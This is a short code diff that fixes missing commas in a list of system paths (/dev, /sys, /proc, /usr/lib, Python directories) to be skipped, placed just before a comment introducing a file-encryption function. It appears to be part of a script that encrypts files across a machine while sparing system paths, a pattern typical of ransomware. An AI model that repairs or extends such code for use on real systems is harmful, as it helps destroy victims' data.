@@ -56,9 +56,9 @@ system_paths = [
     "/dev",
     "/sys",
     "/proc",  # Added to prevent freezing
-    "/usr/lib"
-    "/usr/local/python"
-    "/usr/local/python3"
+    "/usr/lib",
+    "/usr/local/python",
+    "/usr/local/python3",
 ]
 
 # Function to encrypt a file
